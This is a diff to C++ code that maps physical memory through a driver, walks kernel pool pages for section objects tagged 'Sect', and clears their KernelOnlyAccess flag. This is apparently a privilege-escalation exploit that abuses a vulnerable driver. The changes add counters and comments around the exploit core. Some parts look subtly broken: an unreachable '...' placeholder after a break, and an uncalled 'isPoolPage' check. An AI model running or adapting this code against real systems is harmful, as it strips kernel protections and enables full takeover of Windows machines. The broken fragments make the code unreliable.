@@ -161,29 +161,49 @@ int main()
 	myIo.read.QuadPart = 0x2000;
 	
 	bool bFound = false;
+	
+	int step = 0;
+	int iCounter = 0;
+	uint8_t* cCounter = NULL;
 	if (DriverMapMemory(hDriver, &myIo)) {
-
+		
+		//remember step 
+		step++;
+		
+		//reset counter in a step 
+		iCounter = 0;
+		
 		auto i = 0ULL;
 		for (i = 0; i < myRanges[nOfRange - 1].End; i += 0x1000) {
 			if (bFound) {
 				DriverUnmapMemory(hDriver, &myIo);
 				break;
 			}
+			
 			if (!isInsidePhysicalRAM(i, myRanges, nOfRange))
 				continue;
+			
 			if (!isPoolPage)
 				continue;
+			
 			if (!DriverUnmapMemory(hDriver, &myIo))
 				break;
+			
 			myIo.offset = i;
+			
 			if (!DriverMapMemory(hDriver, &myIo))
 				break;
+			
+			//remember counter 
+			iCounter++;
+			
 			uint8_t* lpCursor = (uint8_t*)(myIo.virtualmemory);
 			uint32_t previousSize = 0;
 
 			while (true) {
 				auto pPoolHeader = (PPOOL_HEADER)lpCursor;
 				auto blockSize = (pPoolHeader->BlockSize << 4);
+				
 				auto previousBlockSize = (pPoolHeader->PreviousSize << 4);
 
 				if (previousBlockSize != previousSize ||
@@ -195,6 +215,10 @@ int main()
 				previousSize = blockSize;
 
 				if (0x74636553 == pPoolHeader->PoolTag &0x7FFFFFFF) {
+					
+					//Save cCounter 
+					cCounter = lpCursor;
+					
 					auto pObjectHeader = (POBJECT_HEADER)(lpCursor + 0x30);
 					if (pObjectHeader->HandleCount >= 0  && pObjectHeader->HandleCount <= 3  && pObjectHeader->KernelObject == 1 && pObjectHeader->Flags == 0x16 && pObjectHeader->KernelOnlyAccess == 1)
 					{
@@ -203,6 +227,9 @@ int main()
 						pObjectHeader->KernelOnlyAccess = 0;
 						bFound = true;
 						break;
+						
+						//Time to save step, cCounter, iCounter to cache 
+						...
 					}
 				}
 					
